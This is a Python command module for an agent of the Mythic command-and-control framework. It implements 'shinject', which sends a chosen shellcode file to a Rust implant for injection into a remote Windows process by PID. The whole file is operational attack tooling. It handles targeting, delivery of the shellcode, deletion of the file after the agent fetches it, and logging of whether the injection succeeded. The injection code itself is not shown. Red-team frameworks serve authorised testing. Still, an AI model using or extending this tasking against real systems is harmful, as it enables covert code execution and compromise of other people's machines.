from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import base64


class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID", 
                display_name="PID",
                type=ParameterType.Number,
                description="Process ID to inject into.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    ),
                ]),
            CommandParameter(
                name="shellcode",
                cli_name="Shellcode",
                display_name="Shellcode File", 
                type=ParameterType.File,
                description="Shellcode file to inject",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    ),
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.\n\tUsage: {}".format(ShinjectCommand.help_cmd))
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(ShinjectCommand.help_cmd))
        self.load_args_from_json_string(self.command_line)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject (modal popup)"
    description = "Inject shellcode into a remote process."
    version = 1
    author = "@checkymander"
    argument_class = ShinjectArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            # Get file information from Mythic using the file ID
            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                AgentFileID=taskData.args.get_arg("shellcode"),
                TaskID=taskData.Task.ID,
            ))
            
            if file_resp.Success and len(file_resp.Files) > 0:
                file_data = file_resp.Files[0]
                
                # Extract file information using available attributes
                file_name = getattr(file_data, 'Filename', 'shellcode.bin')
                file_size = getattr(file_data, 'Size', 0)
                agent_file_id = getattr(file_data, 'AgentFileId', taskData.args.get_arg("shellcode"))
                
                # Set display parameters for UI
                response.DisplayParams = "Injecting {} ({} bytes) into PID {}".format(
                    file_name, file_size, taskData.args.get_arg("pid")
                )
                
                # Transform parameters for Rust agent
                # Rust expects "shellcode-file-id" but Python side uses "shellcode"
                taskData.args.add_arg("shellcode-file-id", agent_file_id)
                taskData.args.remove_arg("shellcode")
                
                # Optional: Set file to delete after agent fetches it
                await SendMythicRPCFileUpdate(MythicRPCFileUpdateMessage(
                    AgentFileID=agent_file_id,
                    DeleteAfterFetch=True,
                ))
                
            else:
                response.Success = False
                response.Error = "Failed to find shellcode file with ID: {}".format(taskData.args.get_arg("shellcode"))
                
        except Exception as e:
            response.Success = False
            response.Error = "Error processing shellcode file: {}".format(str(e))
            
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response from shellcode injection
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            # Handle both string and JSON responses from Rust agent
            if isinstance(response, dict):
                response_text = response.get("output", str(response))
            else:
                response_text = str(response)
            
            # Send response to Mythic
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=response_text.encode()
            ))
            
            # Log operation event based on success/failure
            if any(success_word in response_text.lower() for success_word in ["success", "injected", "executed"]) and "fail" not in response_text.lower():
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message="Successfully injected shellcode into PID {}".format(task.args.get_arg("pid")),
                    Level="info"
                ))
            elif "error" in response_text.lower() or "fail" in response_text.lower():
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message="Failed to inject shellcode into PID {}: {}".format(task.args.get_arg("pid"), response_text),
                    Level="warning"
                ))
                
        except Exception as e:
            error_msg = "Error processing shinject response: {}".format(str(e))
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=error_msg.encode()
            ))
            resp.Success = False
            resp.Error = error_msg
            
        return resp